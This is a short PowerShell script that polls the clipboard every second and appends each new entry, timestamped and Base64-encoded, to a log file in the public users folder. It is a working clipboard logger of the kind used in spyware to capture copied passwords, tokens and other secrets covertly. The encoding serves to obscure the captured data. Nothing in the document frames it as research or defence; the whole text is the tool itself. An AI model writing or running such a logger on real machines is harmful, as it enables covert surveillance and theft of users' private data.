$C1 = ''
While($true){
    $C2 = GCB
    if($C2 -ne $C1){
        $Date = Date
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes("[$($Date.ToShortDateString()) $($Date.ToShortTimeString())] CB: $C2")
        [Convert]::ToBase64String($Bytes) >> C:\users\public\clog.txt
    }
    $C1 = $C2
    Sleep 1
}